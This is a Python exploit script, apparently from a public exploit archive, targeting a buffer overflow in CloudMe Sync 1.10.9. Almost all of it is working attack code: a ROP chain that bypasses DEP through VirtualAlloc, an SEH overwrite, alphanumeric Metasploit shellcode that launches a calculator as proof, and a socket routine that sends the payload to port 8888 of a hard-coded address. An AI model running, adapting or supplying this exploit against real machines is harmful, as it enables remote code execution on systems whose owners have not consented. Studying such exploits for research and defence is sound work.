#!/usr/bin/env python
#---------------------------------------------------------------------------------------------------#
# Exploit Title   : CloudMe Sync <= 1.10.9 - Buffer Overflow (SEH) (DEP Bypass)                     #
# Date            : 05/31/2018                                                                      #
# Exploit Author  : Manoj Ahuje                                                                     #
# Linkedin        : https://www.linkedin.com/in/manojahuje/                                         #
# Vendor Homepage : https://www.cloudme.com/                                                        #
# Software Link   : https://www.cloudme.com/downloads/CloudMe_1109.exe                              #
# Tested on       : Windows 7 Ultimate (x64) - Service Pack 1                                       # 
#---------------------------------------------------------------------------------------------------#

import socket,struct

host="192.168.129.134"
 
def create_rop_chain1():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #ESI - SET  DWORD pointer to vitualalloc in ESI
      0x61e93a2c,  # POP ECX # RETN [Qt5Gui.dll] 
      0x690398a0,  # ptr to &VirtualAlloc() [IAT Qt5Core.dll]
      0x6fed7840,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [libstdc++-6.dll] 
      0x68b55c9f,  # XCHG EAX,ESI # RETN [Qt5Core.dll] 
	  
      #EBP - lpAddress (return address)Redirect Execution flow to ESP (n Call to ESP)
      0x61e1a949,  # POP EBP # RETN [Qt5Gui.dll] 
      0x68d652e1,  # & call esp [Qt5Core.dll]
	  
      #EBX - dwSize(0x1)
      0x69a87c26,  # POP EDX # RETN [Qt5Network.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll] 
      0x66e049b7,  # POP EBX # RETN [Qt5Xml.dll] 
      0xffffffff,  #  
      0x68faa5f6,  # INC EBX # RETN [Qt5Core.dll] 
      0x68f8063c,  # ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll]

      #EDX - flallocationtype (0x1000) 
      0x6994f6e8,  # POP EAX # RETN [Qt5Network.dll] 
      0x7cfc896b,  # put delta into eax (-> put 0x00001000 into edx)
      0x69a76004,  # ADD EAX,83038642 # ADD AL,53 # RETN [Qt5Network.dll] 
      0x61f2735a,  # XCHG EAX,EDX # RETN [Qt5Gui.dll] 
	  
      #ECX - flprotect (0x40)
      0x61d0cf5f,  # POP EAX # RETN [Qt5Gui.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x6feb3a1e,  # NEG EAX # RETN [libstdc++-6.dll] 
      0x68bf90bb,  # XCHG EAX,ECX # RETN [Qt5Core.dll]

      #EDI -  rop nop	  
      0x61ec405a,  # POP EDI # RETN [Qt5Gui.dll] 
      0x6fe4ceac,  # RETN (ROP NOP) [libstdc++-6.dll]
	  
      # EAX - ESP points 4 bytes into buffer - to compensate
      0x61ba8370,  # POP EAX # RETN [Qt5Gui.dll] 
      0x90909090,  # nop
	  
      #push on stack in
      0x68aa7f55,  # PUSHAD # RETN [Qt5Core.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain1() 
                            
#msf payload calc alpha numeric

shellcode =  ""
shellcode += "\x89\xe3\xd9\xe5\xd9\x73\xf4\x5a\x4a\x4a\x4a\x4a"
shellcode += "\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
shellcode += "\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41"
shellcode += "\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"
shellcode += "\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49"
shellcode += "\x6c\x6b\x58\x4e\x62\x63\x30\x57\x70\x77\x70\x53"
shellcode += "\x50\x6e\x69\x6b\x55\x64\x71\x39\x50\x50\x64\x6e"
shellcode += "\x6b\x42\x70\x64\x70\x6c\x4b\x43\x62\x36\x6c\x6e"
shellcode += "\x6b\x43\x62\x75\x44\x6e\x6b\x52\x52\x64\x68\x46"
shellcode += "\x6f\x38\x37\x50\x4a\x76\x46\x64\x71\x4b\x4f\x4e"
shellcode += "\x4c\x77\x4c\x35\x31\x61\x6c\x77\x72\x76\x4c\x37"
shellcode += "\x50\x4a\x61\x5a\x6f\x74\x4d\x37\x71\x39\x57\x38"
shellcode += "\x62\x5a\x52\x30\x52\x66\x37\x6e\x6b\x50\x52\x62"
shellcode += "\x30\x6c\x4b\x62\x6a\x57\x4c\x6c\x4b\x52\x6c\x47"
shellcode += "\x61\x74\x38\x6d\x33\x71\x58\x43\x31\x38\x51\x50"
shellcode += "\x51\x6c\x4b\x33\x69\x67\x50\x35\x51\x48\x53\x6e"
shellcode += "\x6b\x57\x39\x75\x48\x69\x73\x54\x7a\x63\x79\x4e"
shellcode += "\x6b\x35\x64\x6c\x4b\x35\x51\x6a\x76\x46\x51\x39"
shellcode += "\x6f\x6e\x4c\x6f\x31\x48\x4f\x44\x4d\x36\x61\x48"
shellcode += "\x47\x34\x78\x6b\x50\x74\x35\x69\x66\x73\x33\x73"
shellcode += "\x4d\x49\x68\x55\x6b\x43\x4d\x47\x54\x74\x35\x68"
shellcode += "\x64\x63\x68\x4e\x6b\x46\x38\x66\x44\x33\x31\x59"
shellcode += "\x43\x61\x76\x6c\x4b\x66\x6c\x50\x4b\x4c\x4b\x50"
shellcode += "\x58\x47\x6c\x65\x51\x69\x43\x6c\x4b\x63\x34\x6e"
shellcode += "\x6b\x43\x31\x68\x50\x4e\x69\x61\x54\x65\x74\x65"
shellcode += "\x74\x51\x4b\x51\x4b\x73\x51\x73\x69\x62\x7a\x42"
shellcode += "\x71\x69\x6f\x39\x70\x51\x4f\x73\x6f\x43\x6a\x4e"
shellcode += "\x6b\x52\x32\x78\x6b\x4e\x6d\x31\x4d\x53\x5a\x67"
shellcode += "\x71\x6c\x4d\x4f\x75\x48\x32\x57\x70\x77\x70\x43"
shellcode += "\x30\x66\x30\x61\x78\x46\x51\x6e\x6b\x70\x6f\x6e"
shellcode += "\x67\x59\x6f\x6b\x65\x4f\x4b\x78\x70\x6d\x65\x39"
shellcode += "\x32\x50\x56\x73\x58\x6c\x66\x6c\x55\x4d\x6d\x6d"
shellcode += "\x4d\x49\x6f\x49\x45\x65\x6c\x45\x56\x73\x4c\x45"
shellcode += "\x5a\x6b\x30\x6b\x4b\x39\x70\x53\x45\x34\x45\x4d"
shellcode += "\x6b\x42\x67\x65\x43\x63\x42\x70\x6f\x50\x6a\x37"
shellcode += "\x70\x66\x33\x6b\x4f\x69\x45\x30\x63\x35\x31\x72"
shellcode += "\x4c\x65\x33\x76\x4e\x75\x35\x42\x58\x45\x35\x67"
shellcode += "\x70\x41\x41"                            
nop = "\x90"*10  
 
#payload = "A"*(2232)
junk1 = "A"*(756+790-6-4)
rop = rop_chain
junk2 = "C"*(2232-len(junk1)-len(rop)-len(nop)-len(shellcode))
nseh = "GGGG"
seh = struct.pack('<L',0x6998FB2E)#network   81C4 6C070000    ADD ESP,76C

sc = junk1+rop+nop+shellcode+junk2+nseh+seh+"B"*40000 
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((host,8888))
s.send(sc)
print 'Sending Packets'
print 'Check calculator should be running'
